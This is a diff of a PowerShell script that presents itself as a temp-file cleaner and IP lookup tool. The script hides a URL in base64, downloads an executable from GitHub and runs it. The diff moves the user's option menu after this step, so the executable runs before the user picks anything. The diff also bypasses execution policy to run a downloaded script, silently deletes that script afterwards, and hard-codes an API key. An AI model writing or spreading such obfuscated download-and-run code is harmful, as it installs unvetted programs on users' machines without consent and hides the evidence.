@@ -9,18 +9,7 @@ Write-Host "Description: This tool cleans temporary files, optimizes your system
 Write-Host "Usage: The script will automatically download and run the tool." -ForegroundColor Magenta
 Write-Host ""
 
-Write-Host "Choose an option:" -ForegroundColor Cyan
-Write-Host "1. Clear Temporary Files Opt" -ForegroundColor Green
-Write-Host "2. Doing Nothing" -ForegroundColor Yellow
-Write-Host "3. Full Cleanup Delete (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
-Write-Host "4. Clear Browser Cache (FireFox, Chrome, Edge,)" -ForegroundColor Blue
-Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
-Write-Host "6. Memory Optimizer (Clear The Cached Memory)" -ForegroundColor Cyan
-Write-Host "7. IP Lookup (Get Public IP Address Information)" -ForegroundColor Yellow
-
-$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"
-
-# Ensure the tool is downloaded, executed, and deleted before processing user choices
+# Ensure the tool is downloaded and executed before processing user choices
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
@@ -40,23 +29,35 @@ if (Test-Path $output1) {
 }
 
 # Process user choices after the tool execution
+Write-Host "Choose an option:" -ForegroundColor Cyan
+Write-Host "1. Clear Temporary Files Opt" -ForegroundColor Green
+Write-Host "2. Doing Nothing" -ForegroundColor Yellow
+Write-Host "3. Full Cleanup Delete (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
+Write-Host "4. Clear Browser Cache (FireFox, Chrome, Edge,)" -ForegroundColor Blue
+Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
+Write-Host "6. Memory Optimizer (Clear The Cached Memory)" -ForegroundColor Cyan
+Write-Host "7. IP Lookup (Get Public IP Address Information)" -ForegroundColor Yellow
+
+$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"
+
 if ($choice -eq '7') {
     Write-Host "Enter the IP address to lookup:" -ForegroundColor Cyan
     $ip = Read-Host "IP Address"
 
     if ($ip) {
-        $apiUrl = "http://ip-api.com/json/$ip"
+        $apiUrl = "https://api.ipqs.com/?key=pybNtey4wx4c18AxraeTAAYRE4nQD62K&ip=$ip&format=json"
 
         try {
             $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction Stop
             $ipInfo = $response.Content | ConvertFrom-Json
 
             Write-Host "========= IP Lookup Result =========" -ForegroundColor Cyan
-            Write-Host "IP Address   : $($ipInfo.query)" -ForegroundColor Yellow
+            Write-Host "IP Address   : $($ipInfo.ip_address)" -ForegroundColor Yellow
             Write-Host "Country      : $($ipInfo.country)" -ForegroundColor Yellow
-            Write-Host "Region       : $($ipInfo.regionName)" -ForegroundColor Yellow
+            Write-Host "Region       : $($ipInfo.region)" -ForegroundColor Yellow
             Write-Host "City         : $($ipInfo.city)" -ForegroundColor Yellow
             Write-Host "ISP          : $($ipInfo.isp)" -ForegroundColor Yellow
+            Write-Host "Fraud Score  : $($ipInfo.fraud_score)" -ForegroundColor Yellow
             Write-Host "====================================" -ForegroundColor Cyan
         } catch {
             Write-Host "Failed to fetch IP information. Please check the IP address or your internet connection." -ForegroundColor Red
@@ -203,3 +204,7 @@ try {
 
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
 powershell -NoProfile -ExecutionPolicy Bypass -File $localScriptPath
+
+if (Test-Path $localScriptPath) {
+    Remove-Item $localScriptPath -Force -ErrorAction SilentlyContinue
+}
